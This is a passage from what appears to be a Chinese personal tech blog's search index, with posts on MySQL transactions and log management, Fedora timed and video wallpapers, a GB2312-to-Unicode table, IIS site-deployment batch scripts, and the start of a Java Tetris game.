AUTOCOMMIT=(OFF|ON)|(0|1): 为当前连接启用或禁用autocommit模式,默认ON ,未提交前其他人不能查看 TODO: 程序是否也需要自动执行commit(如果程序写了事务开始的,那么也需要写结束,那就是和服务器设置没有什么关系) my.cnf 修改(存在频繁和大量数据修改时，建议关闭自动提交) [mysqld] AUTOCOMMIT=0 隐式提交 https://www.cnblogs.com/kerrycode/p/8649101.html START TRANSACTION SET AUTOCOMMIT = 1 DDL ALTER、CREATE、DROP DCL GRANT、REVOKE、SET PASSWORD 锁定语句 LOCK TABLES、UNLOCK TABLES TRUNCATE TABLE LOAD DATA INFILE SELECT FOR UPDATE ","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/:7:1","tags":["linux","mysql"],"title":"Mysql 存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"1.7. RODO “重做日志”,是事务日志的一种 ,在事务ACID中,实现的是\"D\"持久化的作用 ","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/:8:0","tags":["linux","mysql"],"title":"Mysql 存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"1.8. UNDO “回滚日志”,是事务日志的一种,在事务ACID中,实现的是\"A\"、\"C\",原子性和一致性的作用 ","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/:9:0","tags":["linux","mysql"],"title":"Mysql 存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"1.9. mysql 四种隔离级别 READ UNCOMMITTED 允许事务查看其他事务所进行的未提交更改 READ COMMITTED 允许事务查看其他事务所进行的已提交更改 REPEATABLE READ*** 确保每个事务的SELECT输出一致 InnoDB的默认级别(show variables like '%iso%') SERIALIZABLE 将一个事务的结果与其他事务完全隔离 ","date":"2022-06-28","objectID":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/:10:0","tags":["linux","mysql"],"title":"Mysql 存储引擎","uri":"/posts/mysql/%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"},{"categories":["linux","运维记事"],"content":"Mysql 日志管理","date":"2022-06-28","objectID":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/","tags":["linux","mysql"],"title":"Mysql 日志管理","uri":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"1. Mysql 日志管理 ","date":"2022-06-28","objectID":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/:1:0","tags":["linux","mysql"],"title":"Mysql 日志管理","uri":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"1.1. 类型 日志文件 选项 文件名(表名称) 程序 错误 --log-error host_name.err N/A 常规 --general_log host_name.loggeneral_log N/A 慢(速)查询 --slow_query_log--long_query_time host_name-show.logshow_log mysqldumpslow 二进制 --log-bin--expire-logs-days host_name-bin.000001 mysqlbinlog 审计 --audit_log--audit_log_file audit.log N/A ","date":"2022-06-28","objectID":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/:2:0","tags":["linux","mysql"],"title":"Mysql 日志管理","uri":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"1.2. 错误日志 配置方法: [mysqld] log-error=/var/log/mysql/mysql.log 查看方法 mysql\u003e show variables like '%log_error% 作用 记录mysql数据库的一般状态及报错信息,是我们对于数据库常规报错处理的常用日志 ","date":"2022-06-28","objectID":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/:3:0","tags":["linux","mysql"],"title":"Mysql 日志管理","uri":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"1.3. 常规日志 配置方法 [mysqld] general_log=on general_log_file=/var/log/mysql/server2.log 查看方法 show variables like '%gen%' 作用 记录mysql所有执行成功的语句,可以作审计用,但很少开启 ","date":"2022-06-28","objectID":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/:4:0","tags":["linux","mysql"],"title":"Mysql 日志管理","uri":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"1.4. 二进制日志(binlog) 二进制日志会记录已提交的数据,以event的形式记录到二进制文件中,其常用的记录格式有: row: 行模式,即数据行的变化过程,将某一个值修改到另一个值的过程(建议及常用模式) TODO: mysql 配置文件中是否区分大小写(这个需要根据官方建议核查) statement: 语句模式,直接记录执行过的语句,其优点是记录的数据好分析,数据量级小,比如批量修改,缺点就是记录函数(如:now())类操作不是特别准确(默认模式show variables like '%binlog_format%' ); mixed: 以上两种的混合模式 开启、关闭及记录格式 [mysqld] # 开启 log-bin = /data/mysql56/3307/data/mysql-bin/mysql-bin binlog_format = row # 关闭注释上面两个配置即可 # 临时关闭 set sql_log_bin=0 # 命令行修改 set global binlog_format = 'row' sync_binlog 值为1时，每次事务提交时就向磁盘进行写入 ","date":"2022-06-28","objectID":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/:5:0","tags":["linux","mysql"],"title":"Mysql 日志管理","uri":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"1.5. binlog 管理 pos: 开始位置号 End_log_pos: 结束位置号 查看当前所有二进制日志可用信息: show binary logs; 当前正在使用的binlog日志: show master status 查看二进制日志中记录的事件: show binlog events in 'mysql-bin.000002'; +------------------+-----+-------------+-----------+-------------+---------------------------------------+ | Log_name | Pos | Event_type | Server_id | End_log_pos | Info | +------------------+-----+-------------+-----------+-------------+---------------------------------------+ | mysql-bin.000004 | 4 | Format_desc | 10 | 120 | Server ver: 5.6.50-log, Binlog ver: 4 | | mysql-bin.000004 | 120 | Query | 10 | 192 | BEGIN | | mysql-bin.000004 | 192 | Table_map | 10 | 248 | table_id: 72 (test.test_table) | | mysql-bin.000004 | 248 | Write_rows | 10 | 292 | table_id: 72 flags: STMT_END_F | | mysql-bin.000004 | 292 | Xid | 10 | 323 | COMMIT /* xid=36 */ | +------------------+-----+-------------+-----------+-------------+---------------------------------------+ 查看二进制文件内容(mysqlbinlog可能不会识别default-character-set=utf8这个指令,报错为unknown variable,解决指定参数--no-defaults) TODO: unknown variable ‘default-character-set=utf8’(这个不识别就不识别吧,具体不是很清楚,也没有咨询到解决方案) # 查看binlog内容(仅包含DDL操作) $\u003e /opt/mysql56/bin/mysqlbinlog --no-defaults /data/mysql56/3307/data/mysql-bin/mysql-bin/mysql-bin.000004 # 查看binlog详细内容(注释中包含大概的详细语句) $\u003e /opt/mysql56/bin/mysqlbinlog --no-defaults --base64-output=decode-rows -v mysql-bin.000004 # @1: 代表第一列 @2: 代表第二列 ### INSERT INTO `test`.`test_table` ### SET ### @1=6 ### @2='333' # at 292 # 范围截取 $\u003e /opt/mysql56/bin/mysqlbinlog --no-defaults --start-position=192 --stop-position=323 --base64-output=decode-rows -v ./data/mysql-bin/mysql-bin.000004 # 导出为数据库可恢复文件(恢复执行 source ./binlog.sql) $\u003e /opt/mysql56/bin/mysqlbinlog --no-defaults --start-position=192 --stop-position=323 ./data/mysql-bin/mysql-bin.000004 \u003e ./binlog.sql # 刷新日志(重新生成一个binlog日志) mysql\u003e flush logs; # 设置二进制日志保存天数,默认永久保留(建议永久保留) mysql\u003e set global expire_logs_days = 90; # 手动删除(删除3天前) mysql\u003e purge binary logs before now() - interval 3 day; # 删除到那个日志文件 mysql\u003e purge binary logs to 'mysql-bin.000020'; ","date":"2022-06-28","objectID":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/:6:0","tags":["linux","mysql"],"title":"Mysql 日志管理","uri":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"1.6. 慢日志管理 (my.cnf 中配置无顺序要求) show variables like '%slow%' show variables like '%long% show variables like '%indexes%' 查询 是将mysql服务中影响数据库性能的相关sql语句记录到日志文件中 通过对这些特殊的sql语句分析,改进以达到提高数据库性能的目的 设置 long_query_time: 设定慢查询的阀值,超出设定值的sql即被记录到慢查询日志,缺省值为10s show_query_log : 指定是否开启慢查询日志 slow_query_log_file: 指定慢日志文件存放位置,可以为空,系统会给一个缺省的文件host_name-slow.log min_examined_row_limit: 查询检查返回少于改参数指定行的sql不会记录到慢查询日志 log_queries_not_using_indexes: 不使用索引的慢查询日志是否记录到索引 mysqldumpslow(扩展命令 mysqlsla、pt-query-diagest percona-toolkit) 导出host_name-slow.log日志中执行次数最多的前10条数据 mysqldumpslow -s c -t 10 host_name-slow.log 导出host_name-slow.log日志中平均执行时间的前10条数据 mysqldumpslow -s at -t 10 host_name-slow.log ","date":"2022-06-28","objectID":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/:7:0","tags":["linux","mysql"],"title":"Mysql 日志管理","uri":"/posts/mysql/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/"},{"categories":["linux","那些有用没用的"],"content":"Fedora视频桌面","date":"2022-06-24","objectID":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/","tags":["linux","fedora"],"title":"Fedora视频桌面","uri":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/"},{"categories":["linux","那些有用没用的"],"content":"- 想了一下，网络上关于fedora桌面的美化似乎还是很少的,这对于我大fedora发展似乎是很不利的，凭什么ubuntu就可以有那么多的好东西。 目前正常来说，我们能做的似乎只有简单的修改下壁纸，我记得不知道是那个fedora版本，在设置里面就是可以直接设置壁纸轮换的，但是现在似乎没有这个功能了(至少fedora 32是不能直接设置轮换了),不过可以通过另外的方式解决。这就是下面要说的第一种美化。 ","date":"2022-06-24","objectID":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/:1:0","tags":["linux","fedora"],"title":"Fedora视频桌面","uri":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/"},{"categories":["linux","那些有用没用的"],"content":"壁纸轮换 壁纸轮换实际上在32中默认不能直接设置了(忘记了以前是不是可以)，但是如果你仔细的话，在设置那儿你可以看到有一个壁纸不一样，那个壁纸右下角有一个表一样的小图标，那个就是一个轮换壁纸，虽然不能直接设置轮换，但gnome仍然是支持的，那个壁纸的配置文件是/usr/share/backgrounds/gnome/adwaita-timed.xml,具体引用配置文件的地方是/usr/share/gnome-background-properties/adwaita.xml,因此我们只需要按照他的格式配置一个就可以实现壁纸轮换的功能了。 $\u003e sudo cp /usr/share/backgrounds/gnome/adwaita-timed.xml /home/cxd/.backgrounds/stars-timed.xml $\u003e sudo vim /home/cxd/.backgrounds/stars-timed.xml \u003cbackground\u003e \u003cstarttime\u003e \u003cyear\u003e2020\u003c/year\u003e \u003cmonth\u003e8\u003c/month\u003e \u003cday\u003e17\u003c/day\u003e \u003chour\u003e1\u003c/hour\u003e \u003cminute\u003e00\u003c/minute\u003e \u003csecond\u003e00\u003c/second\u003e \u003c/starttime\u003e \u003cstatic\u003e \u003cduration\u003e4000.0\u003c/duration\u003e \u003cfile\u003e/home/cxd/.backgrounds/stars/00001.jpg\u003c/file\u003e \u003c/static\u003e \u003ctransition type=\"overlay\"\u003e \u003cduration\u003e847.0\u003c/duration\u003e \u003cfrom\u003e/home/cxd/.backgrounds/stars/00001.jpg\u003c/from\u003e \u003cto\u003e/home/cxd/.backgrounds/stars/00050.jpg\u003c/to\u003e \u003c/transition\u003e \u003cstatic\u003e \u003cduration\u003e4000.0\u003c/duration\u003e \u003cfile\u003e/home/cxd/.backgrounds/stars/00050.jpg\u003c/file\u003e \u003c/static\u003e \u003c/background\u003e 以上是我自己配置的一部分,static是指定某一张壁纸展示的时间(秒)和文件位置, transition是指定从那一张壁纸轮换到那一张壁纸，轮换需要多少时间(秒),这个设置可以让轮换的时候看起来比较平滑，过渡的时候有点朦胧的感觉。当然也可以不用设置，不过切换的时候感觉有点怪异就是了,另外时间需要总和为86400即一天,似乎也可以不用，每怎么详细测试过。 $\u003e vim /home/cxd/.backgrounds/stars.xml \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE wallpapers SYSTEM \"gnome-wp-list.dtd\"\u003e \u003c!-- /usr/share/gnome-background-properties --\u003e \u003cwallpapers\u003e \u003cwallpaper deleted=\"false\"\u003e \u003cname\u003eDefault Background\u003c/name\u003e \u003cfilename\u003e/home/cxd/.backgrounds/stars-timed.xml\u003c/filename\u003e \u003coptions\u003ezoom\u003c/options\u003e \u003cshade_type\u003esolid\u003c/shade_type\u003e \u003cpcolor\u003e#3465a4\u003c/pcolor\u003e \u003cscolor\u003e#000000\u003c/scolor\u003e \u003c/wallpaper\u003e \u003c/wallpapers\u003e $\u003e sudo ln -s /home/cxd/.backgrounds/stars.xml /usr/share/gnome-background-properties/stars.xml # 不行的话直接copy到后面的那个目录里面区就可以了 这个配置文件是用来接入系统的，如果你没有分离两个/usr和/home的话，直接做个软链接应该就可以了，或者直接copy到/usr/share/gnome-background-properties/里面区也行。 一般上面两步处理完就可以直接在设置 \u003e 背景 就可以看到你刚刚配置的那个轮换壁纸了，如果看不到，你可以注销登陆或者alt+f2然后输入 r 重启 gnome也可以。 实际上关于壁纸轮换还有个骚操作，就是用定时任务 $\u003e 0 */5 * * * /bin/bash -c 'DISPLAY=:0 GSETTINGS_BACKEND=dconf /usr/bin/gsettings set org.gnome.desktop.background picture-uri \"file:///home/\u003cUser\u003e/.local/share/backgrounds/0$(shuf -i 0-8 -n 1).png\"' ## 需要注意的事，这个切换时间不能太短，否则容易导致桌面崩溃 ","date":"2022-06-24","objectID":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/:2:0","tags":["linux","fedora"],"title":"Fedora视频桌面","uri":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/"},{"categories":["linux","那些有用没用的"],"content":"视频壁纸 https://www.linuxuprising.com/2019/05/livestream-wallpaper-for-your-gnome.html 关于视频壁纸，这应该是很多人想要的，但网络上似乎没有很明确的安装方法，以下我根据多方资料整理出来了一个可用的方案. 以下为具体实现: 环境需要 mplayer用来播放视频用的 xwinwrap 核心工具 supervisord 用来管理程序的 mplayer需要启用rpmfusion库，安装完后直接dnf安装就可以了 $\u003e sudo dnf install https://mirrors.ustc.edu.cn/rpmfusion/free/fedora/rpmfusion-free-release-38.noarch.rpm $\u003e sudo dnf install mplayer 源码位置: https://github.com/ujjwal96/xwinwrap#installing 安装编译: $\u003e git clone https://github.com/r00tdaemon/xwinwrap.git $\u003e cd xwinwrap # fedora 38 $\u003e sudo dnf install libX11-devel libXext-devel libXrender-devel libXrandr-dev gcc -y $\u003e make 将编译后产生的文件xwinwrap复制到/usr/local/bin/下，并赋执行权限即可。 supervisord 可以不安装，不装的话xwinwrap支持直接以守护进程形式运行。 以上环境准备完成。下面简述下我的配置。 xwinwrap启动方式(实际命令说明不做说明了，自己-h就了解了，东西不多) $\u003e /usr/local/bin/xwinwrap -ni -o 1 -fdt -fs -s -st -sp -b -nf -- mplayer -nolirc -framedrop -nosound -loop 0 -wid WID -quiet /home/cxd/.backgrounds/stars/00000.mp4 以上命令终端执行后实际上桌面就已经可以看到效果了 我的supervisor管理配置 [program:xwinwrap] command=/usr/local/bin/xwinwrap -ni -o 1 -fdt -fs -s -st -sp -b -nf -- mplayer -framedrop -nosound -loop 0 -wid WID -quiet /home/cxd/.backgrounds/stars/00000.mp4 directory=/home/cxd/.backgrounds autostart=false autorestart=false user=cxd # 这个是你当前登陆的用户 stopasgroup=true killasgroup=true redirect_stderr=true stdout_logfile=/var/log/supervisor/xwinwrap.log stdout_logfile_maxbytes=10MB stdout_logfile_backups=10 environment=DISPLAY=:1 # 注意: 这个极其重要，必须配置，不然他会找不到显示器，不知道可以用env命令查看下对应用的是那个 注：fedora 32 默认是wayland桌面，xwinwrap似乎也是不支持的，需要切换为X11 文件下载下来后解压到~/.backgrounds/下，复制stars.xml到/usr/share/gnome-background-properties/目录下就可以了，另外里面还包含一个视频。 ","date":"2022-06-24","objectID":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/:3:0","tags":["linux","fedora"],"title":"Fedora视频桌面","uri":"/posts/other/fedora%E8%A7%86%E9%A2%91%E6%A1%8C%E9%9D%A2/"},{"categories":["那些有用没用的"],"content":"Gb2312Unicode对照表","date":"2022-06-24","objectID":"/posts/other/gb2312unicode%E5%AF%B9%E7%85%A7%E8%A1%A8/","tags":["linux"],"title":"Gb2312Unicode对照表","uri":"/posts/other/gb2312unicode%E5%AF%B9%E7%85%A7%E8%A1%A8/"},{"categories":["那些有用没用的"],"content":" 0xA1A1, 0x3000, /* '　' -\u003e 12288 */ 0xA1A2, 0x3001, /* '、' -\u003e 12289 */ 0xA1A3, 0x3002, /* '。' -\u003e 12290 */ 0xA1A4, 0x30FB, /* '·' -\u003e 12539 */ 0xA1A5, 0x02C9, /* 'ˉ' -\u003e 713 */ 0xA1A6, 0x02C7, /* 'ˇ' -\u003e 711 */ 0xA1A7, 0x00A8, /* '¨' -\u003e 168 */ 0xA1A8, 0x3003, /* '〃' -\u003e 12291 */ 0xA1A9, 0x3005, /* '々' -\u003e 12293 */ 0xA1AA, 0x2015, /* '—' -\u003e 8213 */ 0xA1AB, 0xFF5E, /* '～' -\u003e 65374 */ 0xA1AC, 0x2016, /* '‖' -\u003e 8214 */ 0xA1AD, 0x2026, /* '…' -\u003e 8230 */ 0xA1AE, 0x2018, /* '‘' -\u003e 8216 */ 0xA1AF, 0x2019, /* '’' -\u003e 8217 */ 0xA1B0, 0x201C, /* '“' -\u003e 8220 */ 0xA1B1, 0x201D, /* '”' -\u003e 8221 */ 0xA1B2, 0x3014, /* '〔' -\u003e 12308 */ 0xA1B3, 0x3015, /* '〕' -\u003e 12309 */ 0xA1B4, 0x3008, /* '〈' -\u003e 12296 */ 0xA1B5, 0x3009, /* '〉' -\u003e 12297 */ 0xA1B6, 0x300A, /* '《' -\u003e 12298 */ 0xA1B7, 0x300B, /* '》' -\u003e 12299 */ 0xA1B8, 0x300C, /* '「' -\u003e 12300 */ 0xA1B9, 0x300D, /* '」' -\u003e 12301 */ 0xA1BA, 0x300E, /* '『' -\u003e 12302 */ 0xA1BB, 0x300F, /* '』' -\u003e 12303 */ 0xA1BC, 0x3016, /* '〖' -\u003e 12310 */ 0xA1BD, 0x3017, /* '〗' -\u003e 12311 */ 0xA1BE, 0x3010, /* '【' -\u003e 12304 */ 0xA1BF, 0x3011, /* '】' -\u003e 12305 */ 0xA1C0, 0x00B1, /* '±' -\u003e 177 */ 0xA1C1, 0x00D7, /* '×' -\u003e 215 */ 0xA1C2, 0x00F7, /* '÷' -\u003e 247 */ 0xA1C3, 0x2236, /* '∶' -\u003e 8758 */ 0xA1C4, 0x2227, /* '∧' -\u003e 8743 */ 0xA1C5, 0x2228, /* '∨' -\u003e 8744 */ 0xA1C6, 0x2211, /* '∑' -\u003e 8721 */ 0xA1C7, 0x220F, /* '∏' -\u003e 8719 */ 0xA1C8, 0x222A, /* '∪' -\u003e 8746 */ 0xA1C9, 0x2229, /* '∩' -\u003e 8745 */ 0xA1CA, 0x2208, /* '∈' -\u003e 8712 */ 0xA1CB, 0x2237, /* '∷' -\u003e 8759 */ 0xA1CC, 0x221A, /* '√' -\u003e 8730 */ 0xA1CD, 0x22A5, /* '⊥' -\u003e 8869 */ 0xA1CE, 0x2225, /* '∥' -\u003e 8741 */ 0xA1CF, 0x2220, /* '∠' -\u003e 8736 */ 0xA1D0, 0x2312, /* '⌒' -\u003e 8978 */ 0xA1D1, 0x2299, /* '⊙' -\u003e 8857 */ 0xA1D2, 0x222B, /* '∫' -\u003e 8747 */ 0xA1D3, 0x222E, /* '∮' -\u003e 8750 */ 0xA1D4, 0x2261, /* '≡' -\u003e 8801 */ 0xA1D5, 0x224C, /* '≌' -\u003e 8780 */ 0xA1D6, 0x2248, /* '≈' -\u003e 8776 */ 0xA1D7, 0x223D, /* '∽' -\u003e 8765 */ 0xA1D8, 0x221D, /* '∝' -\u003e 8733 */ 0xA1D9, 0x2260, /* '≠' -\u003e 8800 */ 0xA1DA, 0x226E, /* '≮' -\u003e 8814 */ 0xA1DB, 0x226F, /* '≯' -\u003e 8815 */ 0xA1DC, 0x2264, /* '≤' -\u003e 8804 */ 0xA1DD, 0x2265, /* '≥' -\u003e 8805 */ 0xA1DE, 0x221E, /* '∞' -\u003e 8734 */ 0xA1DF, 0x2235, /* '∵' -\u003e 8757 */ 0xA1E0, 0x2234, /* '∴' -\u003e 8756 */ 0xA1E1, 0x2642, /* '♂' -\u003e 9794 */ 0xA1E2, 0x2640, /* '♀' -\u003e 9792 */ 0xA1E3, 0x00B0, /* '°' -\u003e 176 */ 0xA1E4, 0x2032, /* '′' -\u003e 8242 */ 0xA1E5, 0x2033, /* '″' -\u003e 8243 */ 0xA1E6, 0x2103, /* '℃' -\u003e 8451 */ 0xA1E7, 0xFF04, /* '＄' -\u003e 65284 */ 0xA1E8, 0x00A4, /* '¤' -\u003e 164 */ 0xA1E9, 0xFFE0, /* '￠' -\u003e 65504 */ 0xA1EA, 0xFFE1, /* '￡' -\u003e 65505 */ 0xA1EB, 0x2030, /* '‰' -\u003e 8240 */ 0xA1EC, 0x00A7, /* '§' -\u003e 167 */ 0xA1ED, 0x2116, /* '№' -\u003e 8470 */ 0xA1EE, 0x2606, /* '☆' -\u003e 9734 */ 0xA1EF, 0x2605, /* '★' -\u003e 9733 */ 0xA1F0, 0x25CB, /* '○' -\u003e 9675 */ 0xA1F1, 0x25CF, /* '●' -\u003e 9679 */ 0xA1F2, 0x25CE, /* '◎' -\u003e 9678 */ 0xA1F3, 0x25C7, /* '◇' -\u003e 9671 */ 0xA1F4, 0x25C6, /* '◆' -\u003e 9670 */ 0xA1F5, 0x25A1, /* '□' -\u003e 9633 */ 0xA1F6, 0x25A0, /* '■' -\u003e 9632 */ 0xA1F7, 0x25B3, /* '△' -\u003e 9651 */ 0xA1F8, 0x25B2, /* '▲' -\u003e 9650 */ 0xA1F9, 0x203B, /* '※' -\u003e 8251 */ 0xA1FA, 0x2192, /* '→' -\u003e 8594 */ 0xA1FB, 0x2190, /* '←' -\u003e 8592 */ 0xA1FC, 0x2191, /* '↑' -\u003e 8593 */ 0xA1FD, 0x2193, /* '↓' -\u003e 8595 */ 0xA1FE, 0x3013, /* '〓' -\u003e 12307 */ 0xA2B1, 0x2488, /* '⒈' -\u003e 9352 */ 0xA2B2, 0x2489, /* '⒉' -\u003e 9353 */ 0xA2B3, 0x248A, /* '⒊' -\u003e 9354 */ 0xA2B4, 0x248B, /* '⒋' -\u003e 9355 */ 0xA2B5, 0x248C, /* '⒌' -\u003e 9356 */ 0xA2B6, 0x248D, /* '⒍' -\u003e 9357 */ 0xA2B7, 0x248E, /* '⒎' -\u003e 9358 */ 0xA2B8, 0x248F, /* '⒏' -\u003e 9359 */ 0xA2B9, 0x2490, /* '⒐' -\u003e 9360 */ 0xA2BA, 0x2491, /* '⒑' -\u003e 9361 */ 0xA2BB, 0x2492, /* '⒒' -\u003e 9362 */ 0xA2BC, 0x2493, /* '⒓' -\u003e 9363 */ 0xA2BD, 0x2494, /* '⒔' -\u003e 9364 */ 0xA2BE, 0x2495, /* '⒕' -\u003e 9365 */ 0xA2BF, 0x2496, /* '⒖' -\u003e 9366 */ 0xA2C0, 0x2497, /* '⒗' -\u003e 9367 */ 0xA2C1, 0x2498, /* '⒘' -\u003e 9368 */ 0xA2C2, 0x2499, /* '⒙' -\u003e 9369 */ 0xA2C3, 0x249A, /* '⒚' -\u003e 9370 */ 0xA2C4, 0x249B, /* '⒛' -\u003e 9371 */ 0xA2C5, 0x2474, /* '⑴' -\u003e 9332 */ 0xA2C6, 0x2475, /* '⑵' -\u003e 9333 */ 0xA2C7, 0x2476, /* '⑶' -\u003e 9334 */ 0xA2C","date":"2022-06-24","objectID":"/posts/other/gb2312unicode%E5%AF%B9%E7%85%A7%E8%A1%A8/:0:0","tags":["linux"],"title":"Gb2312Unicode对照表","uri":"/posts/other/gb2312unicode%E5%AF%B9%E7%85%A7%E8%A1%A8/"},{"categories":["那些年的收藏"],"content":"IIS命令操作","date":"2022-06-24","objectID":"/posts/scripts/bat/iis%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/","tags":["bat","windows","scripts"],"title":"IIS命令操作","uri":"/posts/scripts/bat/iis%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/"},{"categories":["那些年的收藏"],"content":"1. IIS 站点部署 @echo off title Industrial belt project deployment script echo 1. This script is only suitable for the first installation echo 2. Please check and modify the following variable values before deployment echo Sitename: Site name, please separate with spaces or commas echo BackPort: Site bound port echo NetVersion: .netVersion(as:v4.0) echo NetModel: Program operation mode classic (Integrated) or integrated (Classic) set AppCmd=C:\\Windows\\System32\\inetsrv\\appcmd.exe set Sitename=admin.example.com www.example.com set SitePath=C:\\weboxb\\example.com set BackPort=8010 set NetVersion=v4.0 set NetModel=Integrated set LogPath=D:\\iislogs\\ :: Confirm variable initialisation echo Confirming the initialisation: echo AppCmd=%AppCmd% echo Sitename=%Sitename% echo SitePath=%SitePath% echo BackPort=%BackPort% echo NetVersion=%NetVersion% echo NetModel=%NetModel% echo LogPath=%LogPath% pause (for %%a in (%Sitename%) do ( echo Creating application pool for %%a %AppCmd% add apppool /name:%%a /managedRuntimeVersion:%NetVersion% /managedPipelineMode:%NetModel% if errorlevel 1 goto Error echo Creating site directory for %%a mkdir %SitePath%\\%%a if errorlevel 1 goto Error echo Creating site for %%a %AppCmd% add site /name:%%a /bindings:\"http://%%a:%BackPort%\" /physicalpath:%SitePath%\\%%a if errorlevel 1 goto Error echo Associating application pool for %%a %AppCmd% set site /site.name:%%a /[path='/'].applicationPool:%%a if errorlevel 1 goto Error echo. )) echo The execution is complete, please check the execution log at %LogPath%. goto End :Error echo An error occurred. Please check the configurations and try again. pause exit :End pause ","date":"2022-06-24","objectID":"/posts/scripts/bat/iis%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/:1:0","tags":["bat","windows","scripts"],"title":"IIS命令操作","uri":"/posts/scripts/bat/iis%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/"},{"categories":["那些年的收藏"],"content":"2. IIS 站点域名修改 @echo off title update site bind domain echo Please carefully check the configuration content! pause set AppCmd=C:\\Windows\\System32\\inetsrv\\appcmd.exe set BackPort=80 set DomainName=example.cn set NewDomainName=example.com :: Specify log location :: set LogPath=D:/iislogs/ :: /logfile.directory:%LogPath% %AppCmd% set SITE \"www.%DomainName%\" /bindings:\"http://www.%NewDomainName%:%BackPort%\" :: %AppCmd% set SITE \"www.%DomainName%\" /bindings:\"http://www.%NewDomainName%:%BackPort%,http://www.%NewDomainName%:%BackPort%\" echo The execution is complete, please check the execution result... pause ","date":"2022-06-24","objectID":"/posts/scripts/bat/iis%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/:2:0","tags":["bat","windows","scripts"],"title":"IIS命令操作","uri":"/posts/scripts/bat/iis%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/"},{"categories":["linux","那些有用没用的"],"content":"俄罗斯方块","date":"2022-06-24","objectID":"/posts/scripts/java/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97/","tags":["linux","java","scripts"],"title":"Java 俄罗斯方块","uri":"/posts/scripts/java/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97/"},{"categories":["linux","那些有用没用的"],"content":" import javax.swing.*; import java.awt.*; import java.awt.event.*; import javax.swing.border.EtchedBorder; import javax.swing.border.Border; /** * 游戏主类，继承自JFrame类，负责游戏的全局控制。 * 内含 * 1、一个GameCanvas画布类的实例对象， * 2、一个保存当前活动块 (ErsBlock)实例的对象， * 3、一个保存当前控制面板（ ControlPanel）实例的对象; */ public class ErsBlocksGame extends JFrame { //每填满一行计多少分 public final static int PER_LINE_SCORE = 100; //积多少分以后能升级 public final static int PER_LEVEL_SCORE = PER_LINE_SCORE * 20; //最大级数是10级 public final static int MAX_LEVEL = 10; //默认级数是5 public final static int DEFAULT_LEVEL = 5; private GameCanvas canvas; private ErsBlock block; private boolean playing = false; private ControlPanel ctrlPanel; private JMenuBar bar = new JMenuBar(); private JMenu mGame = new JMenu(\"游戏\" ), mControl = new JMenu(\"控制 \"), mWindowStyle = new JMenu(\"游戏风格 \"), mInfo = new JMenu(\"信息 \"); private JMenuItem miNewGame = new JMenuItem(\"新游戏\" ), miSetBlockColor = new JMenuItem(\"设置方块颜色 ...\"), miSetBackColor = new JMenuItem(\"设置背景颜色 ...\"), miTurnHarder = new JMenuItem(\"升高游戏难度 \"), miTurnEasier = new JMenuItem(\"降低游戏难度 \"), miExit = new JMenuItem(\"退出 \"), miPlay = new JMenuItem(\"开始 \"), miPause = new JMenuItem(\"暂停 \"), miResume = new JMenuItem(\"恢复 \"), miStop = new JMenuItem(\"中止游戏 \"), miAuthor = new JMenuItem(\"版本：俄罗斯方块 1.0\"), miSourceInfo = new JMenuItem(\"源代码由 Java实现\"); private 